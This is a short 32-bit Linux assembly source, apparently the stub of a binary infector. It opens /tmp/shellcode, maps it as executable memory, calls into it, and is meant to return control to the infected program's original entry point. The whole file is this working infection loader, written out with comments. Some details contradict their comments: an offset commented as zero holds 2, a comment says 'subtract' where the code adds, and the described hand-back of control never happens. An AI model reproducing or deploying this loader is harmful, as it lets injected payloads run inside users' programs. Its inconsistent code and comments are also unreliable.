.section .text
.globl _start
_start:
    call   external         #. Store the addr of _start(+5) onto the stack

open:
    movl   $2,%ecx          #. O_RDWR
    popl   %ebx             #. contains pathname to shellcode file
    movl   $0x05,%eax       #. __NR_open
    int    $0x80

lseek:
    movl   $2,%edx          #. int whence = SEEK_END
    movl   %ecx,%ecx        #. off_t offset = 0
    movl   %eax,%ebx        #. int filedes = <fd>
    movl   $0x13,%eax       #. __NR_lseek
    int    $0x80

mmap:
    subl   $24,%esp
    xor    %edx,%edx
    movl   %edx,0x00(%esp)   #. void *addr = NULL;
    movl   %eax,0x04(%esp)   #. size_t length = <offset>
    movl   $0x5,0x08(%esp)   #. int prot = PROT_READ|PROT_EXEC;
    movl   $0x1,0x0C(%esp)   #. int flags = MAP_SHARED;
    movl   %ebx,0x10(%esp)   #. int fd = <fd>;
    movl   $0x0,0x14(%esp)   #. off_t offset = 0;
    movl   $0x5a,%eax        #. __NR_mmap;
    movl   %esp,%ebx         #. %ebx must contain the address of input arguments
    int    $0x80

exec:
    call    *%eax            #. The rationale for the `*' is that you aren't going
                             #. to call to the address %eax; you're going to *load*
                             #. the *value* at %eax, and call *that*.

return:                      #. Here, if our external shellcode was well-behaved
    popl  %eax               #. we should see control returned to this file, which
                             #. will now perform cleanup and pass control back to
                             #. the *original* _start function, prior to infection.

exit:
    movl $1,%eax             #. __NR_exit is 1
    movl $33,%ebx            #. we want to exit with a exit status of 33
    int $0x80                #. again, interrupt the kernel

external:
    popl   %eax              #. The call instruction (at _start) is 5-bytes, so
    addl   $5,%eax           #. to get the addr of _start, we need to subtract
    pushl  %eax              #. this back.
    call   open              #. We now make another call, and save the address of
    .ascii "/tmp/shellcode\0" #. this string onto the stack.
